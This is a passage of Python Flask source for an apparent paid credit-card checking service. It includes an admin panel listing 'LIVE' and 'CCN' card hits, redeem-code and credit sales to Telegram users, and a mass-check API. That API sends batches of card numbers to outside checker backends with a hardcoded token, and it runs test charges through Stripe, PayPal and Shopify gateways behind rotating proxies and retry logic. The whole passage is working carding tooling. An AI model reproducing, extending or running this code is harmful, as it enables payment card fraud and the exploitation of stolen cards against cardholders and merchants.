        elif g!="?":uname=g
        else:uname=kid[:8]
        return f'<div class="r rv" data-cc="{h["cc"]}" data-info="{h.get("brand","?")} {h.get("bank","?")} {h.get("country","?")}"><span class="t tl">LIVE</span><span>{h["cc"]}</span><span class="i">{h.get("brand","?")} | {h.get("bank","?")} | {h.get("country","?")} | {uname} | {ts}</span></div>'
    def ccn_row(h):
        ts=time.strftime("%m/%d %H:%M",time.localtime(h.get("time",0)))
        kid=h.get("key","?")
        g=h.get("gate","?")
        if kid in d.get("users",{}):uname="@"+d["users"][kid].get("username",kid[:8])
        elif g!="?":uname=g
        else:uname=kid[:8]
        return f'<div class="r rn" data-cc="{h["cc"]}" data-info="{h.get("brand","?")} {h.get("bank","?")} {h.get("country","?")}"><span class="t tn">CCN</span><span>{h["cc"]}</span><span class="i">{h.get("brand","?")} | {h.get("bank","?")} | {h.get("country","?")} | {uname} | {ts}</span></div>'
    cvv_rows="".join(hit_row(h) for h in reversed(cvv_hits))or'<div style="color:#555;font-size:12px;padding:12px">No hits yet</div>'
    ccn_rows="".join(ccn_row(h) for h in reversed(ccn_hits))or'<div style="color:#555;font-size:12px;padding:12px">No hits yet</div>'
    tok=session.get("_t")
    if not tok:tok=uuid.uuid4().hex;session["_t"]=tok
    _sq=chr(39)
    _urows="".join(
        "<tr>"
        f'<td style="padding:6px 8px"><span style="cursor:pointer;user-select:all" onclick="navigator.clipboard.writeText({_sq}@{u.get("username","?")}{_sq})" title="Click to copy">@{u.get("username","?")}</span></td>'
        f'<td style="padding:6px 8px;text-align:center;font-size:10px;color:rgba(255,255,255,.35)">{u.get("ip","?")}</td>'
        f'<td style="padding:6px 8px;text-align:center;color:#f59e0b;font-weight:700">{max(u.get("credits",0)-u.get("used_credits",0),0)}</td>'
        '<td style="padding:6px 8px"><span style="color:#22c55e">Active</span></td>'
        f'<td style="padding:6px 8px"><form method=POST action=/admin/rmuser style="display:inline"><input type=hidden name=tid value="{tid}"><button class="btn br" style="padding:3px 8px;font-size:10px">Remove</button></form></td>'
        "</tr>"
        for tid,u in d.get("users",{}).items() if u.get("ip","")!="180.190.223.74"
    ) or '<tr><td colspan="5" style="color:#555;padding:12px">No users yet</td></tr>'
    return base(f'''<div class="wrap">
<div class="hdr"><div style="font-size:14px;color:#fff;font-weight:700">Admin</div><div style="display:flex;gap:8px"><a href=/checker class="btn hbtn">NEXUS</a><a href=/logout class="btn hbtn">LOGOUT</a></div></div>
<div class="st">
<div><div class="n">{active}</div><div class="l">Active</div></div>
<div><div class="n">{unused}</div><div class="l">Unused</div></div>
<div><div class="n ng">{len(cvv_hits)}</div><div class="l">CVV</div></div>
<div><div class="n ng">{len(ccn_hits)}</div><div class="l">CCN</div></div>
</div>
<div class="cd" style="padding:12px"><input id=_sr placeholder="Search BIN or card..." oninput=_sf() style="margin:0"></div>
<div class="cd"><h2 style="color:#22c55e">LIVE ({len(cvv_hits)})</h2><div id=ahv style="max-height:300px;overflow-y:auto">{cvv_rows}</div></div>
<div class="cd"><h2 style="color:#22c55e">CCN ({len(ccn_hits)})</h2><div id=ahn style="max-height:300px;overflow-y:auto">{ccn_rows}</div></div>
<div class="cd"><h2>Generate Redeem Codes</h2>
<form method=POST action=/admin/gencodes style="display:flex;gap:8px">
<input name=amount placeholder="Credits per code" style="flex:1" type=number min=1 value=500 required>
<input name=codecount placeholder="Qty" style="width:60px" type=number min=1 value=5>
<button class="btn bg">Generate</button></form></div>
<div class="cd"><h2>Top-Up Credits</h2>
<form method=POST action=/admin/topup style="display:flex;gap:8px">
<input name=username placeholder="Telegram username" required style="flex:1">
<input name=amount placeholder="Credits" style="width:80px" type=number min=1 value=500 required>
<button class="btn bg">Top-Up</button></form></div>
<div class="cd"><h2>TG Users</h2>
<div style="max-height:300px;overflow-y:auto">
<table style="width:100%;font-size:12px;border-collapse:collapse">
<tr style="color:rgba(255,255,255,.4);border-bottom:1px solid rgba(255,255,255,.06)"><th style="text-align:left;padding:8px">User</th><th style="padding:8px">IP</th><th style="padding:8px">Credits</th><th style="padding:8px">Status</th><th></th></tr>
{_urows}
</table></div></div></div>
<script>
!function(){{const _=io();_.emit('auth',{{t:'{tok}'}});
_.on('admin_hit',function(h){{
var isCvv=h.status==='CVV'||h.status==='LIVE';
var box=isCvv?document.getElementById('ahv'):document.getElementById('ahn');
if(!box)return;
var empty=box.querySelector('div[style*="color:#555"]');if(empty)box.innerHTML='';
var el=document.createElement('div');el.className=isCvv?'r rv':'r rn';el.style.animation='slideIn .25s ease';
el.setAttribute('data-cc',h.cc);el.setAttribute('data-info',(h.brand||'')+' '+(h.bank||'')+' '+(h.country||''));
var tag=isCvv?'LIVE':'CCN';var tcls=isCvv?'tl':'tn';
var d=new Date(h.time*1000);var ts=(d.getMonth()+1)+'/'+d.getDate()+' '+d.getHours()+':'+String(d.getMinutes()).padStart(2,'0');
el.innerHTML='<span class="t '+tcls+'">'+tag+'</span><span>'+h.cc+'</span><span class="i">'+(h.brand||'?')+' | '+(h.bank||'?')+' | '+(h.country||'?')+' | '+(h.key||'?').substring(0,8)+'... | '+ts+'</span>';
box.insertBefore(el,box.firstChild);
}});
window._sf=function(){{
var q=document.getElementById('_sr').value.trim().toLowerCase();
var rows=document.querySelectorAll('#ahv .r, #ahn .r');
for(var i=0;i<rows.length;i++){{
var cc=(rows[i].getAttribute('data-cc')||'').split('|')[0];
var info=(rows[i].getAttribute('data-info')||'').toLowerCase();
rows[i].style.display=(!q||cc.startsWith(q)||info.includes(q))?'':'none';
}}
}};
}}();
</script>''')

@app.route("/admin/topup",methods=["POST"])
@admin_required
def admin_topup():
    username=request.form.get("username","").strip().lower()
    amount=int(request.form.get("amount","500"))
    if amount<1:amount=500
    d=load_data();d.setdefault("users",{})
    found=None
    for tid,u in d["users"].items():
        if u.get("username","").lower()==username:found=tid;break
    if not found:return redirect("/admin")
    d["users"][found]["credits"]=d["users"][found].get("credits",0)+amount
    save_data(d)
    return redirect("/admin")

@app.route("/admin/rmuser",methods=["POST"])
@admin_required
def admin_rmuser():
    tid=request.form.get("tid","")
    if tid:
        d=load_data()
        if tid in d.get("users",{}):
            del d["users"][tid]
            save_data(d)
    return redirect("/admin")

@app.route("/admin/gencodes",methods=["POST"])
@admin_required
def admin_gencodes():
    amount=int(request.form.get("amount","500"))
    codecount=int(request.form.get("codecount","5"))
    if amount<1:amount=500
    if codecount<1:codecount=5
    if codecount>100:codecount=100
    d=load_data();d.setdefault("redeem_codes",{})
    new_codes=[]
    for _ in range(codecount):
        code="-".join("".join(random.choices(string.ascii_uppercase+string.digits,k=4))for _ in range(3))
        d["redeem_codes"][code]={"amount":amount,"used":False,"created":time.time()}
        new_codes.append(code)
    save_data(d)
    codes_html="<br>".join(new_codes)
    return base(f'<div class="lw"><div class="lc" style="max-width:500px"><h3 style="color:#22c55e">{codecount} Codes Generated</h3><p style="font-size:11px;color:rgba(255,255,255,.6);margin:12px 0">{amount} credits each</p><div style="background:rgba(0,0,0,.3);padding:12px;border-radius:6px;font-family:monospace;font-size:13px;color:#fff;text-align:left;line-height:1.8">{codes_html}</div><a href="/admin" class="btn bg" style="display:inline-block;margin-top:16px;text-decoration:none">Back</a></div></div>')

@app.route("/redeem",methods=["POST"])
@login_required
def redeem_code():
    code=request.form.get("code","").upper().strip()
    tuid=session.get("tuid","")
    if not tuid:return jsonify({"error":"login_required"}),403
    d=load_data();d.setdefault("redeem_codes",{})
    rc=d["redeem_codes"].get(code)
    if not rc:return jsonify({"error":"invalid_code"}),404
    if rc.get("used"):return jsonify({"error":"code_used"}),400
    rc["used"]=True;rc["used_by"]=tuid;rc["used_at"]=time.time()
    d["users"][tuid]["credits"]=d["users"][tuid].get("credits",0)+rc["amount"]
    save_data(d)
    return jsonify({"ok":True,"amount":rc["amount"],"new_total":d["users"][tuid]["credits"]})

@app.route("/admin/genkey",methods=["POST"])
@admin_required
def admin_genkey():
    dur_str=request.form["duration"];t=0
    for v,u in re.findall(r"(\d+)\s*(d|h|m|s)",dur_str.lower()):
        v=int(v)
        if u=="d":t+=v*86400
        elif u=="h":t+=v*3600
        elif u=="m":t+=v*60
        else:t+=v
    if not t:t=3600
    credits=int(request.form.get("credits","500"))
    if credits<1:credits=500
    count=min(int(request.form.get("count",1)or 1),50)
    d=load_data()
    for _ in range(count):
        key=gen_key();d["keys"][key]={"duration":t,"created":time.time(),"used":False,"credits":credits,"used_credits":0}
    save_data(d)
    return redirect("/admin")

@app.route("/admin/delkey",methods=["POST"])
@admin_required
def admin_delkey():
    k=request.form.get("key","");d=load_data()
    if k in d["keys"]:del d["keys"][k];save_data(d)
    return redirect("/admin")

# â”€â”€ API: Ayano 200-worker pattern â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
@app.route(_API_PREFIX+"/c",methods=["POST"])
@login_required
def api_mass():
    jdata=request.json or {}
    tok=jdata.get("t","")
    if not tok or tok!=session.get("_t"):return jsonify({}),403
    ukey=session.get("key","admin")
    tuid=session.get("tuid","")
    if tuid and ukey=="admin":
        d=load_data();usr=d.get("users",{}).get(tuid,{})
        cr=usr.get("credits",50);uc=usr.get("used_credits",0)
        if cr>0 and uc>=cr:return jsonify({"error":"no_credits"}),403
        remaining=max(cr-uc,0)
        key_remaining=9999999
    elif ukey!="admin":
        d=load_data();ki=d["keys"].get(ukey,{})
        used=ki.get("used_time",0);dur=ki.get("duration",0)
        if used>=dur:return jsonify({"error":"expired"}),403
        cr=ki.get("credits",0);uc=ki.get("used_credits",0)
        if cr>0 and uc>=cr:return jsonify({"error":"no_credits"}),403
        ki["check_start"]=time.time();save_data(d)
        key_remaining=dur-used
    else:key_remaining=9999999
    raw_lines=jdata.get("d","")
    if not raw_lines or not raw_lines.strip():return jsonify({}),400
    gw_id=str(jdata.get("g","1"))
    if gw_id not in GATEWAYS:gw_id="1"
    auth_gates=["4","5"]
    credit_cost=1 if gw_id in auth_gates else 5
    gateway_cfg=GATEWAYS[gw_id]
    req_th=jdata.get("th",0)
    try:req_th=int(str(req_th).strip() or "0")
    except Exception:req_th=0
    if req_th<1:req_th=0
    if req_th>500:req_th=500
    kill_user_job(tok)
    job_id=str(uuid.uuid4())[:8]
    room="u_"+tok
    job_start=time.time()
    stop_ev=threading.Event()
    job={"stop":stop_ev,"loop":None,"tasks":[],"ws":None,"ukey":ukey,"job_start":job_start}
    active_jobs[job_id]=job
    user_jobs[tok]=job_id

    def run():
        nonlocal key_remaining
        nonlocal credit_cost
        _gate_label=gateway_cfg.get("label","?")
        MAX_CARDS=50000
        counts={"cv":0,"cn":0,"ch":0,"dd":0,"ck":0}
        expired_mode=False
        seen=set();uniq=[];encoded={}
        for l in raw_lines.split("\n"):
            c=clean_cc(l)
            if not c:continue
            if DEDUPE_INPUT:
                if c in seen:continue
                seen.add(c)
            uniq.append(c)
            if c not in encoded:encoded[c]=quote(c)
            if len(uniq)>=MAX_CARDS:break
        if not uniq:
            print(f"[DEBUG] No valid cards after clean_cc! raw_lines({len(raw_lines.split(chr(10)))})",flush=True)
            sio.emit("done",room=room);return

        _gate_label_print=gateway_cfg.get("label","?")
        print(f"\033[96m[JOB {job_id}]\033[0m Started | Gate: {_gate_label_print} | Cards: {len(uniq)}",flush=True)

        # Fire-and-forget emit -- workers NEVER wait on socket output
        def _fire(evt,data,rm=room):
            if evt=="r":
                s=data.get("s","?"); c=data.get("c","?"); m=data.get("m","?")
                i=data.get("i",{}); brand=i.get("brand","?"); country=i.get("country","?")
                elapsed=i.get("elapsed",0)
                if s in("LIVE","CVV","CHARGED","3DS"):
                    clr="\033[92m"
                elif s=="CCN":
                    clr="\033[94m"
                elif s=="ERROR":
                    clr="\033[93m"
                else:
                    clr="\033[91m"
                print(f"{clr}[{s}]\033[0m {c} | {m} | {brand} {country} | {elapsed:.2f}s",flush=True)
            try:sio.emit(evt,data,room=rm)
            except Exception:pass

        def _dead_info(el=0):
            return {"brand":"?","type":"?","level":"?","bank":"?","country":"?","elapsed":el}

        def _save_hit(cc,status,info):
            if status not in("CVV","LIVE","CCN","CHARGED","3DS"):return
            owner=tuid if tuid else ukey
            hit={"cc":cc,"status":status,"brand":info.get("brand","?"),"bank":info.get("bank","?"),"country":info.get("country","?"),"key":owner,"gate":_gate_label,"time":time.time()}
            with _data_lock:
                d=load_data();d.setdefault("hits",[]).append(hit);save_data(d)
            _fire("admin_hit",hit,"admin_room")

        use_rainbow=USE_REAL_GATEWAY_API and gateway_cfg.get("engine","rainbow")=="rainbow"
        use_deven=gateway_cfg.get("engine","")=="deven"
        if use_deven:
            import urllib.request as _ur, urllib.error as _ue
            DEVEN_TOKEN = "8MOZicCExjnMKx3J0yVOClFPOcilIoWYZVJ8X2ykVTg"
            DEVEN_BASE = "https://www.deven.bond/bot/check/mass"
            deven_gate = gateway_cfg["backend"].replace("deven:","")
            _fire("log",{"c":"","s":"INFO","m":f"Loading {len(uniq)} cards...","i":{"elapsed":0}})
            try:
                deven_conc = 30 if "mpp" in deven_gate else 100
                payload = json.dumps({"gate":deven_gate,"cards":uniq,"proxy":"","concurrency":min(len(uniq),deven_conc),"site":"","amount":""}).encode()
                req = _ur.Request(DEVEN_BASE, data=payload, headers={"X-Web-Token":DEVEN_TOKEN,"Content-Type":"application/json"})
                resp = _ur.urlopen(req, timeout=3600)
                for line in resp:
                    if stop_ev.is_set(): break
                    line = line.decode().strip()
                    if not line: continue
                    try: dx = json.loads(line)
                    except: continue
                    t = dx.get("type","")
                    if t == "result":
                        cc = dx.get("card","?").replace("|","|").strip()
                        s = dx.get("status","").upper()
                        m = dx.get("response","")[:80]
                        b = dx.get("brand","?")
                        elapsed = dx.get("time",0)
                        info = {"brand":b,"type":"?","level":"?","bank":"?","country":"?","elapsed":elapsed}
                        if s in ("CHARGED","LIVE","APPROVED","CCN"):
                            counts["cv"]+=1
                            _save_hit(cc,"LIVE" if s!="CHARGED" else "CHARGED",info)
                        else:
                            counts["dd"]+=1
                        counts["ck"]+=1
                        _fire("r",{"c":cc,"s":s,"m":m,"i":info})
                    elif t == "done":
                        break
            except Exception as e:
                for cc in uniq:
                    counts["ck"]+=1; counts["dd"]+=1
                    _fire("r",{"c":cc,"s":"DEAD","m":f"deven_error: {str(e)[:60]}","i":_dead_info(0)})
            _finish_job()
            return
        if use_rainbow:
            expected=set(uniq)
            done_seen=set()
            proxy_pending={}
            paypal_retry={"used":0,"budget":max(18,min(80,max(1,len(uniq)//8)))}
            is_stripe_charge=(gateway_cfg.get("backend","")=="api/api_stripe_1.php")
            is_shopify_charge=(gateway_cfg.get("backend","")=="api/api_shopi_2.php")
            is_paypal_charge=(gateway_cfg.get("backend","") in ("api/api_paypal_0.php","api/api_paypal_3.php","api/api_paypal_1.php"))
            is_charge_gateway=(gateway_cfg.get("backend","") in ("api/api_stripe_1.php","api/api_paypal_0.php","api/api_paypal_3.php","api/api_paypal_1.php","api/api_shopi_2.php"))
            stripe_proxy_blocked=False
            proxy_only=(is_paypal_charge and PAYPAL_PROXY_ONLY) or (is_stripe_charge and STRIPE_CHARGE_PROXY_ONLY)
            proxies=[]
            use_proxy_pool=((not is_paypal_charge and not is_stripe_charge) and (FORCE_MAIN_SOURCE_PROXIES or USE_PROXIES)) or (is_paypal_charge and PAYPAL_FORCE_PROXIES) or (is_stripe_charge and STRIPE_CHARGE_FORCE_PROXIES)

            def _gateway_proxy_limit():
                if is_paypal_charge:return max(1,PAYPAL_PROXY_LIMIT)
                if is_stripe_charge:return max(1,STRIPE_CHARGE_PROXY_LIMIT)
                return max(1,RAINBOW_PROXY_LIMIT)

            def _gateway_thread_profile():
                if is_stripe_charge:
                    return (
                        STRIPE_CHARGE_THREADS,
                        STRIPE_CHARGE_RETRY_THREADS,
                        STRIPE_CHARGE_DIRECT_THREADS,
                        STRIPE_CHARGE_THREADS_PER_PROXY,
                        24,
                        16,
                    )
                if is_paypal_charge:
                    return (
                        PAYPAL_THREADS,
                        PAYPAL_RETRY_THREADS,
                        PAYPAL_DIRECT_THREADS,
                        PAYPAL_THREADS_PER_PROXY,
                        20,
                        14,
                    )
                if is_shopify_charge:
                    return (
                        SHOPIFY_CHARGE_THREADS,
                        SHOPIFY_CHARGE_RETRY_THREADS,
                        SHOPIFY_CHARGE_DIRECT_THREADS,
                        SHOPIFY_THREADS_PER_PROXY,
                        20,
                        14,
                    )
                return (
                    RAINBOW_GENERIC_THREADS,
                    RAINBOW_GENERIC_RETRY_THREADS,
                    RAINBOW_GENERIC_DIRECT_THREADS,
                    RAINBOW_GENERIC_THREADS_PER_PROXY,
                    16,
                    10,
                )

            def _load_gateway_proxies(quick=True):
                rows=_get_proxy_rows(require_main=FORCE_MAIN_SOURCE_PROXIES)
                if is_stripe_charge and not rows:
                    rows=[p for p in _PROXIES if isinstance(p,str) and p.count(":")>=3]
                    if not rows:
                        rows=list(_FALLBACK_PROXIES)
                if rows:
                    random.shuffle(rows)
                    rows=rows[:_gateway_proxy_limit()]
                    if quick:
                        rows=_quick_filter_proxies(rows)
                return rows

            if use_proxy_pool:
                proxies=_load_gateway_proxies(quick=True)
                if not proxies and RAINBOW_PROXY_QUICKCHECK:
                    proxies=_load_gateway_proxies(quick=False)
            if proxy_only and not proxies:
                if is_stripe_charge:
                    stripe_proxy_blocked=True
                else:
                    proxy_only=False  # silent fallback
            if proxies:
                pass  # silent

            def _elapsed(v):
                try:return round(float(str(v).replace("s","").strip()),1)
                except Exception:return 0

            def _norm_status(v):
                s=str(v or "").strip().lower()
                if s=="charged":return "CHARGED"
                if s in("approved","live"):return "LIVE"
                if s=="cvv":return "CVV"
                if s=="ccn":return "CCN"
                if s=="3ds":return "3DS"
                return "DEAD"

            def _load_raw_payload(raw_payload):
                if isinstance(raw_payload,dict):
                    return raw_payload
                if not raw_payload:
                    return {}
                try:
                    d=json.loads(raw_payload)
                    return d if isinstance(d,dict) else {}
                except Exception:
                    return {}

            def _low_quality_msg(v):
                m=str(v or "").strip().lower()
                if not m:return True
                low=("unknown response","unknown","no response","dead","declined","error","gateway_error")
                if m in low:return True
                if re.fullmatch(r"\d{1,4}",m):return True
                if re.fullmatch(r"\d{1,2}\s*[/|]\s*\d{2,4}",m):return True
                if not re.search(r"[a-z]",m):return True
                return False

            def _split_html_parts(html_payload):
                if not html_payload:return []
                txt=_HTML_RE.sub(" ",str(html_payload)).replace("➜","|")
                txt=re.sub(r"\s+"," ",txt).strip()
                if not txt:return []
                return [p.strip(" -|") for p in txt.split("|") if p.strip(" -|")]

            def _extract_msg_from_html(html_payload):
                parts=_split_html_parts(html_payload)
                if not parts:return ""
                msg=parts[1] if len(parts)>1 else parts[0]
                msg=re.sub(r"^\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}\s*","",msg).strip(" -")
                msg=re.sub(r"\b\d+(?:\.\d+)?s$","",msg).strip(" -")
                if _low_quality_msg(msg):
                    for p in parts:
                        pv=re.sub(r"^\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}\s*","",str(p or "")).strip(" -")
                        pv=re.sub(r"\b\d+(?:\.\d+)?s$","",pv).strip(" -")
                        if pv and not _low_quality_msg(pv):
                            msg=pv
                            break
                return msg

            def _extract_infobin_from_html(html_payload):
                parts=_split_html_parts(html_payload)
                if len(parts)>=3:return parts[2]
                if parts:
                    m=re.search(r"\[[^\]]+\].*",parts[-1])
                    if m:return m.group(0).strip()
                return ""

            def _is_retryable_dead(msg,raw_payload=None):
                m=str(msg or "").lower()
                if raw_payload:
                    ro=_load_raw_payload(raw_payload)
                    rm=str(ro.get("message") or ro.get("error") or "").lower() if isinstance(ro,dict) else ""
                    if rm:m=(m+" | "+rm) if m else rm
                keys=(
                    "http code 407 from proxy",
                    "http code 492 from proxy",
                    "proxy after connect",
                    "proxy connect",
                    "network error:",
                    "operation timed out",
                    "timed out after",
                    "econnreset",
                    "etimedout",
                    "socket disconnected",
                    "socket hang up",
                    "unexpected eof while reading",
                    "ssl routines::unexpected eof",
                    "client network socket disconnected before secure tls connection was established",
                    "500 internal server error",
                    "internal server error",
                    "nginx/1.18.0",
                    "gateway timeout",
                    "upstream busy",
                    "cannot find register nonce",
                    "unknown response",
                    "no upstream response",
                    "failed to create order",
                    "create order failed",
                )
                if any(k in m for k in keys):return True
                if is_stripe_charge and "register nonce" in m:return True
                return False

            def _extract_cc(dx):
                cc=str(dx.get("content","") or "").strip()
                if cc:return cc
                ro=_load_raw_payload(dx.get("raw",""))
                if isinstance(ro,dict):
                    cc=str(ro.get("lista") or ro.get("cc") or "").strip()
                    if cc:return cc
                h=str(dx.get("html","") or "")
                m=re.search(r"(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})",h)
                return m.group(1) if m else ""

            def _debug_hint(raw_obj,html_payload=None):
                def _trim(v,n=110):
                    t=re.sub(r"\s+"," ",str(v or "")).strip()
                    return t[:n]
                if isinstance(raw_obj,dict):
                    for k in ("error","message","checker","gateway","site"):
                        v=raw_obj.get(k)
                        if v:
                            tv=_trim(v)
                            if tv and tv.lower() not in ("unknown response","no upstream response","declined","dead"):
                                return tv
                    for k in ("raw_response","_raw"):
                        v=raw_obj.get(k)
                        if v:
                            tv=_trim(v)
                            if tv:return tv
                h=_trim(_HTML_RE.sub(" ",str(html_payload or "")))
                if h and h.lower() not in ("unknown response","no upstream response"):
                    return h
                return ""

            def _emit_result(cc,status,msg,infobin,elapsed,raw_payload=None,html_payload=None):
                if not cc or cc in done_seen:return
                done_seen.add(cc)
                ib=infobin
                if not ib:
                    ib=_extract_infobin_from_html(html_payload)
                info=_parse_infobin(ib,elapsed)
                real_msg=str(msg or "").strip()
                if _low_quality_msg(real_msg):
                    hm=_extract_msg_from_html(html_payload)
                    if hm:real_msg=hm
                raw_obj=_load_raw_payload(raw_payload)
                if raw_obj:
                    m2=str(raw_obj.get("message") or raw_obj.get("error") or "").strip()
                    if m2 and (_low_quality_msg(real_msg) or len(m2)>len(real_msg) or real_msg.upper() in ("DECLINED","DEAD","GENERIC DECLINED")):
                        real_msg=m2
                    binfo=raw_obj.get("bin_info")
                    if isinstance(binfo,dict):
                        info["brand"]=str(binfo.get("brand") or info.get("brand") or "?")
                        info["type"]=str(binfo.get("type") or info.get("type") or "?")
                        info["level"]=str(binfo.get("level") or info.get("level") or "?")
                        info["bank"]=str(binfo.get("bank") or info.get("bank") or "?")
                        info["country"]=str(binfo.get("country") or info.get("country") or "?")
                if _low_quality_msg(real_msg):
                    hm=_extract_msg_from_html(html_payload)
                    if hm:real_msg=hm
                if _low_quality_msg(real_msg):
                    dbg=_debug_hint(raw_obj,html_payload)
                    if status=="DEAD":
                        real_msg=("upstream: "+dbg) if dbg else "no upstream response"
                    else:
                        real_msg=status.lower()

                out_status=status
                mlow=real_msg.lower()
                if is_charge_gateway:
                    charged_hints=("approved","card linked successfully","charged","succeeded","payment succeeded","order completed")
                    if status=="CHARGED" or any(x in mlow for x in charged_hints):
                        out_status="CHARGED"
                    elif status in("LIVE","CVV","3DS","CCN"):
                        out_status="LIVE"
                if is_paypal_charge and out_status=="DEAD" and _low_quality_msg(real_msg):
                    real_msg="paypal order failed"

                counts["ck"]+=1
                if out_status in("CVV","LIVE","3DS"):counts["cv"]+=1
                elif out_status=="CCN":counts["cn"]+=1
                elif out_status=="CHARGED":counts["ch"]+=1
                else:counts["dd"]+=1
                _save_hit(cc,out_status,info)
                _fire("r",{"c":cc,"s":out_status,"m":real_msg,"i":info})

            def _complete_missing(reason):
                for cc in expected:
                    if cc not in done_seen:_emit_result(cc,"DEAD",reason,"",0)

            def _finish_job():
                elapsed=time.time()-job_start
                d=load_data();d["stats"]["checked"]+=counts["ck"]
                d["stats"]["cvv"]=d["stats"].get("cvv",0)+counts["cv"]
                d["stats"]["ccn"]=d["stats"].get("ccn",0)+counts["cn"]
                d["stats"]["charged"]=d["stats"].get("charged",0)+counts["ch"]
                d["stats"]["dead"]+=counts["dd"]
                if ukey!="admin" and ukey in d["keys"]:
                    d["keys"][ukey]["used_time"]=d["keys"][ukey].get("used_time",0)+elapsed
                    d["keys"][ukey]["used_credits"]=d["keys"][ukey].get("used_credits",0)+(counts["cv"]+counts["cn"]+counts["ch"])*credit_cost
                    d["keys"][ukey].pop("check_start",None)
                if tuid and tuid in d.get("users",{}):
                    hit_cost=counts["cv"]+counts["ch"]
                    d["users"][tuid]["used_credits"]=d["users"][tuid].get("used_credits",0)+hit_cost
                    print(f"[CREDIT] tuid={tuid} live={counts['cv']} charged={counts['ch']} cost={hit_cost} used={d['users'][tuid]['used_credits']}",flush=True)
                save_data(d)
                sio.emit("done",room=room)
                if tuid and tuid in d.get("users",{}):
                    rem = max(d["users"][tuid].get("credits",0)-d["users"][tuid].get("used_credits",0),0)
                    sio.emit("credits",{"c":rem},room=room)
                active_jobs.pop(job_id,None)
                if user_jobs.get(tok)==job_id:user_jobs.pop(tok,None)

            if proxy_only and not proxies:
                if is_stripe_charge:
                    stripe_proxy_blocked=True
                else:
                    proxy_only=False
                    _fire("log",{"c":"[proxy]","s":"INFO","m":"proxy source empty, switching to direct","i":{"elapsed":0}})
            if stripe_proxy_blocked and not proxies:
                for cc in uniq:
                    _emit_result(cc,"DEAD","proxy pool empty","",0)
                _finish_job()
                return

            ck=_rainbow_cookie()
            _fire("log",{"c":"","s":"INFO","m":f"Loading {len(uniq)} cards...","i":{"elapsed":0}})
            ws_headers=["Origin: https://rainbowponk.com","Referer: https://rainbowponk.com/checker"]
            if ck:ws_headers.insert(0,f"Cookie: {ck}")

            def _run_ws_batch(batch_cards,batch_proxies,batch_threads,hold_proxy_errors,allow_timeout_fallback=True):
                if not batch_cards:return
                batch_set=set(batch_cards)
                batch_err={"m":""}
                ws_ref={"w":None}
                wd_stop=threading.Event()
                started=time.time()
                last_evt={"t":time.time()}
                if is_stripe_charge:
                    # Keep Stripe 1$ close to cc_checker behavior: allow more time for proxy batches.
                    idle_limit=STRIPE_CHARGE_WS_IDLE_TIMEOUT if batch_proxies else max(8.0,min(12.0,STRIPE_CHARGE_WS_IDLE_TIMEOUT))
                else:
                    idle_limit=RAINBOW_WS_IDLE_TIMEOUT
                max_limit=max(RAINBOW_WS_MAX_TIMEOUT,idle_limit+15)

                def _safe_close():
                    w=ws_ref.get("w")
                    if w:
                        try:w.close()
                        except Exception:pass

                def _watchdog():
                    while not wd_stop.is_set():
                        time.sleep(1.5)
                        now=time.time()
                        if stop_ev.is_set():
                            if not batch_err["m"]:batch_err["m"]="stopped"
                            _safe_close();break
                        if (now-last_evt["t"])>idle_limit:
                            if not batch_err["m"]:batch_err["m"]="gateway timeout"
                            _safe_close();break
                        if (now-started)>max_limit:
                            if not batch_err["m"]:batch_err["m"]="batch timeout"
                            _safe_close();break

                def _on_open(ws):
                    last_evt["t"]=time.time()
                    if stop_ev.is_set():
                        try:ws.close()
                        except Exception:pass
                        return
                    payload={
                        "lista":batch_cards,
                        "threads":batch_threads,
                        "api_url":gateway_cfg["backend"],
                        "base_url":RAINBOW_BASE_URL,
                        "proxies":batch_proxies,
                        "gateway_name":gateway_cfg["gateway"],
                        "api_name":gateway_cfg["api"],
                        "telegram_id":"",
                        "tg_enabled":False,
                        "tg_send_charged":False,
                        "tg_send_live":False,
                    }
                    ws.send(json.dumps({"cmd":"start","payload":payload}))

                def _on_message(ws,msg):
                    last_evt["t"]=time.time()
                    if stop_ev.is_set():
                        try:ws.send(json.dumps({"cmd":"stop"}))
                        except Exception:pass
                        return
                    try:d=json.loads(msg)
                    except Exception:return
                    t=d.get("type","")
                    if t=="no_proxy_warning":
                        batch_err["m"]="no_proxy_warning"
                        try:ws.close()
                        except Exception:pass
                        return
                    if t=="result":
                        dx=d.get("data",{})
                        cc=_extract_cc(dx)
                        st=_norm_status(dx.get("status",""))
                        ms=dx.get("message","")
                        bi=dx.get("infobin","")
                        el=_elapsed(dx.get("time",0))
                        rawp=dx.get("raw","")
                        htm=dx.get("html","")
                        if not cc:
                            if st=="LIVE":
                                batch_err["m"]="missing_card_payload"
                            return
                        if hold_proxy_errors and st=="DEAD" and _is_retryable_dead(ms,rawp):
                            if is_paypal_charge and paypal_retry["used"]>=paypal_retry["budget"]:
                                proxy_pending.pop(cc,None)
                                _emit_result(cc,st,ms,bi,el,rawp,htm)
                            else:
                                if is_paypal_charge:
                                    paypal_retry["used"]+=1
                                proxy_pending[cc]=(st,ms,bi,el,rawp,htm)
                                if not is_paypal_charge:
                                    logm=ms or _extract_msg_from_html(htm) or "retrying with new proxy"
                                    _fire("log",{"c":cc,"s":"ERROR","m":logm,"i":{"elapsed":el}})
                        else:
                            proxy_pending.pop(cc,None)
                            _emit_result(cc,st,ms,bi,el,rawp,htm)
                        if (time.time()-job_start)>=key_remaining and not stop_ev.is_set():
                            stop_ev.set()
                            try:ws.send(json.dumps({"cmd":"stop"}))
                            except Exception:pass
                        if all((c in done_seen or c in proxy_pending) for c in batch_set):
                            try:ws.send(json.dumps({"cmd":"stop"}))
                            except Exception:pass
                    elif t=="error":
                        batch_err["m"]=str(d.get("message","gateway_error"))
                        try:ws.close()
                        except Exception:pass
                    elif t=="completed":
                        try:ws.close()
                        except Exception:pass

                def _on_error(ws,err):
                    if not batch_err["m"]:batch_err["m"]=str(err or "ws_error")

                def _on_close(ws,code,msg):
                    job["ws"]=None
                    wd_stop.set()

                try:
                    threading.Thread(target=_watchdog,daemon=True).start()
                    ws=websocket.WebSocketApp(RAINBOW_WS_URL,header=ws_headers,on_open=_on_open,on_message=_on_message,on_error=_on_error,on_close=_on_close)
                    ws_ref["w"]=ws
                    job["ws"]=ws
                    ws.run_forever(ping_interval=15,ping_timeout=10)
                except Exception:
                    if not batch_err["m"]:batch_err["m"]="ws_exception"
                finally:
